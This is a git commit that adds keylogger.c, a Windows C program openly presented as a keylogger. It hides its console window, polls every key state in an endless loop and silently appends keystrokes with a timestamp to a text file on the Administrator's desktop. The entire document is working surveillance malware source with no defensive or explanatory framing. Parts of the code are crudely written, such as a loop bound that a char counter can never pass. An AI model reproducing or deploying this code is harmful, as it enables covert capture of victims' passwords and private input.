64a3a329f1bf2ecf0f6f612fb457b563d18eb1a4
KoKoeShwin <57564126+KoKoeShwin@users.noreply.github.com>
2020-10-10 17:24:57 +0630

    Create keylogger.c

---
+++ keylogger.c
@@ -0,0 +1,58 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <conio.h>
+
+void hidewindow();
+FILE *fp,*fn;
+
+int main()
+{
+    hidewindow();
+    char capture;
+    time_t s;
+    time(&s);
+
+    while(1)
+    {
+        for(capture=0;capture<=256;capture++)
+        {
+        if(GetAsyncKeyState(capture)== -32767)
+        {
+            fp=fopen("C:\\Users\\Administrator\\Desktop\\Record.txt","a+");
+            fn=fopen("Signal.txt","w");
+            fprintf(fn,"\nKeylogging System halt......... !");
+                fclose(fn);
+            if(toascii(capture)==27)
+                {
+                    system("Signal.txt");
+                    exit(0);
+                }
+            else if(toascii(capture)==13)
+                {
+                fprintf(fp,"\n");
+                fprintf(fp,"%s\n",ctime(&s));
+                }
+            else if(toascii(capture)==8)
+                fprintf(fp,"<");
+
+                fprintf(fp,"%c",capture);
+
+                fclose(fp);
+
+        }
+
+        }
+    }
+
+    return 0;
+}
+
+void hidewindow()
+{
+    HWND Stealth;
+    AllocConsole();
+    Stealth=FindWindowA("ConsoleWindowClass",0);
+    ShowWindow(Stealth,0);
+
+}
